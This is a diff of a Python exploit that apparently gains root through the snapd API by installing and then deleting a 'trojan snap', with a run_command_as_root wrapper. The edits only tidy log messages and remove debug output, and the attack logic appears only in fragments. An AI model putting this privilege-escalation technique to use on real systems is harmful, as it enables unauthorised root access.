@@ -95,7 +95,7 @@ def delete_snap(client_sock):
                 + post_payload)
 
     # Send our payload to the snap API
-    LOG.info("[+] Deleting trojan snap (and sleeping 5 seconds)...")
+    LOG.info("Deleting trojan snap (and sleeping 5 seconds)...")
     client_sock.sendall(http_req.encode("utf-8"))
 
     # Receive the data and extract the JSON
@@ -103,14 +103,10 @@ def delete_snap(client_sock):
 
     # Exit on probably-not-vulnerable
     if '"status":"Unauthorized"' in http_reply:
-        LOG.info("[!] System may not be vulnerable, here is the API reply:\n\n")
-        # LOG.info(http_reply) debug output
         return False
 
     # Exit on failure
     if 'status-code":202' not in http_reply:
-        LOG.info("[!] Did not work, here is the API reply:\n\n")
-        # LOG.info(http_reply) debug output
         return False
 
     # We sleep to allow the API command to complete, otherwise the install
@@ -153,15 +149,14 @@ Content-Type: application/octet-stream
                  'Content-Length: ' + str(len(post_payload)) + '\r\n\r\n')
 
     # Send the headers to the snap API
-    LOG.info("[+] Installing the trojan snap (and sleeping 8 seconds)...")
+    LOG.info("Installing the trojan snap (and sleeping 8 seconds)...")
     client_sock.sendall(http_req1.encode("utf-8"))
 
     # Receive the initial HTTP/1.1 100 Continue reply
     http_reply = client_sock.recv(8192).decode("utf-8")
 
     if 'HTTP/1.1 100 Continue' not in http_reply:
-        LOG.error("[!] Error starting POST conversation, here is the reply:\n")
-        # LOG.info(http_reply) debug output
+        LOG.error("Error starting POST conversation")
         return False
 
     # Now we can send the payload
@@ -173,8 +168,6 @@ Content-Type: application/octet-stream
 
     # Exit on failure
     if 'status-code":202' not in http_reply:
-        LOG.info("[!] Did not work, here is the API reply:\n\n")
-        LOG.info(http_reply)  # debug output
         return False
 
     # Sleep to allow time for the snap to install correctly. Otherwise,
@@ -221,7 +214,7 @@ def run_command_as_root(command):
     if not delete_snap(client_sock):
         return False
 
-    LOG.info("Command Executed Successfully \n")
+    LOG.info("Command Executed Successfully ")
     return True
 
 
